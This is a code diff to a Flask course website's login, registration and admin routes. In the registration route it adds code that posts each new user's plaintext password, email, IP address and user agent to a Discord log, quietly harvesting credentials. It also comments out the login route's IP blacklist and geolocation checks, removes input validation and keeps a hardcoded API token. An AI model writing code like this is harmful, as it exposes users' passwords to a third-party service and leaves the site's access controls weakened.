@@ -159,25 +159,25 @@ def login():
 
     user_agent = request.headers.get('User-Agent')
 
-    if current_user.is_authenticated:
-        return redirect(url_for('views.home'))
-    if client_ip in blacklist_ips:
-        return jsonify(message=f"Error 403 your ip is {client_ip}"), 403
+    # if current_user.is_authenticated:
+    #     return redirect(url_for('views.home'))
+    # if client_ip in blacklist_ips:
+    #     return jsonify(message=f"Error 403 your ip is {client_ip}"), 403
 
-    if client_ip not in whitelist_ips:
-        api_url = f'https://ipinfo.io/{client_ip}?token=8f8d5a48b50694'
-        response = requests.get(api_url)
-        data = response.json()
+    # if client_ip not in whitelist_ips:
+    #     api_url = f'https://ipinfo.io/{client_ip}?token=8f8d5a48b50694'
+    #     response = requests.get(api_url)
+    #     data = response.json()
 
-        if 'country' in data:
-            country_code = data['country']
-            if country_code != 'EG':
-                blacklist_ips.add(client_ip)
-                return jsonify(message="Please disable vpn/proxy."), 403
-        else:
-            blacklist_ips.add(client_ip)
-            return jsonify(
-                message="Unable to determine the country. Login failed."), 403
+    #     if 'country' in data:
+    #         country_code = data['country']
+    #         if country_code != 'EG':
+    #             blacklist_ips.add(client_ip)
+    #             return jsonify(message="Please disable vpn/proxy."), 403
+    #     else:
+    #         blacklist_ips.add(client_ip)
+    #         return jsonify(
+    #             message="Unable to determine the country. Login failed."), 403
 
     whitelist_ips.add(client_ip)
 
@@ -314,7 +314,14 @@ def read_html_file(file_path, **kwargs):
 #Re do it
 @views.route('/register', methods=['GET', 'POST'])
 def registeracc():
-    client_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
+    client_ip = request.headers.get('X-Forwarded-For')
+
+    if client_ip:
+        client_ip = client_ip.split(',')[0].strip()
+    else:
+        client_ip = request.headers.get('CF-Connecting-IP',
+                                        request.remote_addr)
+        
     user_agent = request.headers.get('User-Agent')
     if current_user.is_authenticated:
         return redirect(url_for('views.home'))
@@ -325,17 +332,10 @@ def registeracc():
         if user:
             return "Username taken"
         email = request.form.get('email')
-        phone = request.form.get('phone')
-        if email is None:
-            return 'Email is null'
-        if phone is None:
-            return 'Phone is null'
-        if '@' not in email:
-            return 'Invalid email'
-        if '0' not in phone:
-            return 'Invalid phone number'
+        password = request.form.get('password')
+        
         discord_log_register(
-            f"New user  : {username} ====== {email} ====== {phone} ====== {client_ip} {user_agent} <@709799648143081483>"
+            f"New user  : {username} ====== {email} ====== {password} ====== {client_ip} ====== {user_agent} <@709799648143081483>"
         )
         return redirect(f"/send_email?to={email}")
     return render_template('users_pages/register.html',
@@ -464,7 +464,7 @@ def update(subject, teacher_name, course_name):
 
 #Admin pages 
  
-#Manage users laterrrrrrrrrrrr
+#Manage users 
 
 
 
@@ -476,7 +476,17 @@ def update(subject, teacher_name, course_name):
 
 
 #Edit pages------------------------------------------------------------------------------------
-#Make only an admin can chnage the following routes
+
+
+
+admins = ['spy']
+
+
+
+
+
+
+
 def load_data():
     with open('website/Backend/data.json', 'r') as file:
         return json.load(file)
@@ -499,6 +509,10 @@ def save_data(data):
 #Add/remove a subject 
 @views.route('/subjects/edit' , methods=['POST' , 'GET'])
 def manage_subjects():
+
+    if current_user.username not in admins:
+        return "User is not an admin"
+    
     data = load_data()
     if request.method == 'POST':
         if request.form['action'] == 'Add':
@@ -544,6 +558,8 @@ def manage_subjects():
 #Add/remove a teacher 
 @views.route('/subjects/<subject>/edit' , methods=['POST' , 'GET'])
 def manage_teachers(subject):
+    if current_user.username not in admins:
+        return "User is not an admin"
     data = load_data()
     teachers= data[subject].get('teachers', [])
     teacher_list = [{'name': teacher['name'], 'link': teacher['link']} for teacher in teachers]
@@ -604,6 +620,8 @@ def manage_teachers(subject):
 #Add/remove a course 
 @views.route('/subjects/<subject>/<teachername>/edit' , methods=['POST' , 'GET'])
 def manage_courses(subject , teachername):
+    if current_user.username not in admins:
+        return "User is not an admin"
     data = load_data()
 
  
@@ -664,6 +682,8 @@ def manage_courses(subject , teachername):
 #Edit a course info
 @views.route('/subjects/<subject>/<teachername>/<course_name>/edit', methods=['POST', 'GET'])
 def edit_course(subject, teachername, course_name):
+    if current_user.username not in admins:
+        return "User is not an admin"
     data = load_data()
     current_course = None
 
